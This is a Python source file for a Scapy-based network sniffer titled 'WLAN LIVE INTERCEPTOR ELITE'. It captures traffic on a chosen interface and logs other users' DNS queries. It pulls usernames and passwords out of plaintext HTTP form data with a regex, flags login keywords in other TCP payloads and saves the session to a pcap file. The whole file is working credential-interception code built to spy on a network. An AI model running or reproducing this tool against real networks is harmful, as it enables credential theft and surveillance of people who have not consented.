import re
import os
from datetime import datetime
from scapy.all import sniff, IP, TCP, UDP, DNS, DNSQR, conf, Raw, wrpcap
from rich.console import Console
from rich.table import Table
from rich.live import Live
from core.ui import draw_header

console = Console()
session_pcap = []
captured_intel = []


class SnifferEngine:
    def parse_http(self, load):
        """Deep inspection of HTTP for credential extraction."""
        decoded = load.decode('utf-8', errors='ignore')
        intel = []
        # Hunt for standard form credentials
        patterns = [
            r"(?i)(user|username|login|email|pass|password|pwd)=(.[^&^ ]*)"]
        for p in patterns:
            matches = re.findall(p, decoded)
            if matches:
                intel.append(
                    f"[bold red]CREDS: {matches[0][0]}={matches[0][1]}[/bold red]")
        return intel

    def callback(self, packet):
        if not packet.haslayer(IP):
            return

        session_pcap.append(packet)
        src, dst = packet[IP].src, packet[IP].dst
        info = []

        # 1. Capture DNS Queries (See what sites they visit)
        if packet.haslayer(DNSQR):
            query = packet[DNSQR].qname.decode().strip('.')
            info.append(f"[bold cyan]DNS Query: {query}[/bold cyan]")

        # 2. Capture TCP Traffic
        elif packet.haslayer(TCP):
            port = packet[TCP].dport
            if packet.haslayer(Raw):
                load = packet[Raw].load
                if port in [80, 8080]:
                    info.extend(self.parse_http(load))
                elif any(kw in load.lower() for kw in [b"user", b"pass", b"login"]):
                    info.append(
                        "[yellow]Sensitive Data Pattern Detected[/yellow]")

            # Metadata for encrypted traffic
            if not info and port == 443:
                info.append("[dim]Encrypted HTTPS Stream[/dim]")

        if info:
            captured_intel.append({
                "time": datetime.now().strftime("%H:%M:%S"),
                "src": src, "dst": dst, "intel": " | ".join(info)
            })

    def generate_table(self):
        table = Table(title="Live Intelligence Stream",
                      expand=True, border_style="cyan")
        table.add_column("Time", style="dim", width=10)
        table.add_column("Source", style="green", width=15)
        table.add_column("Target", style="magenta", width=15)
        table.add_column("Intercepted Intel", style="white")

        # Show last 12 entries
        for entry in captured_intel[-12:]:
            table.add_row(entry["time"], entry["src"],
                          entry["dst"], entry["intel"])
        return table

    def start(self):
        draw_header("WLAN LIVE INTERCEPTOR ELITE")
        ifaces = [i.name for i in conf.ifaces.data.values()]
        console.print(f"[dim]Available: {', '.join(ifaces)}[/dim]")

        # Cross-platform Interface Selection
        iface = console.input(
            "[bold yellow]Select Interface (e.g. en0): [/bold yellow]").strip() or conf.iface

        console.print(f"[*] Monitoring [bold cyan]{iface}[/bold cyan]...")
        if not os.path.exists("logs"):
            os.makedirs("logs")

        try:
            # Use Live reconstruction for real-time scrolling
            with Live(self.generate_table(), refresh_per_second=2) as live:
                def wrapped_cb(pkt):
                    self.callback(pkt)
                    live.update(self.generate_table())

                # Sniff both TCP and UDP (for DNS)
                sniff(iface=iface, prn=wrapped_cb, store=0, filter="ip")

        except KeyboardInterrupt:
            if session_pcap:
                wrpcap("logs/capture.pcap", session_pcap)
                console.print(
                    f"\n[green][+] Session evidence saved to logs/capture.pcap[/green]")
